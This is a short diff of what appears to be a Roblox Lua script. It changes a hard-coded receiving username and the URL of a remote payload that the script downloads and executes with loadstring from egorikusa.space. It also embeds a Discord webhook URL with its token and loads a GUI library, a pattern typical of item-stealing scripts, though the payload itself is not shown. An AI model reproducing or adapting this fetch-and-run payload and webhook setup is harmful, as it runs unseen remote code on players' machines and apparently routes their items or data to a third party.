@@ -1,4 +1,4 @@
-Username = "cfcaptin1"
+Username = "Ali_gamer7689"
 Webhook = "https://discord.com/api/webhooks/1269112828263010414/lAjHKM0Af-hFjejFQitcqnuEHXeoe1HRJXHSiFaiZoKoCymkJ4CLnr1rjvVaSM7XqqMu"
 
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
@@ -60,4 +60,4 @@ OrionLib:Init()
 
 getgenv().gui = false
 
-loadstring(game:HttpGet("https://egorikusa.space/592809397651ab277a9ddc65.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/2469da689d354e636cf73301.lua", true))()
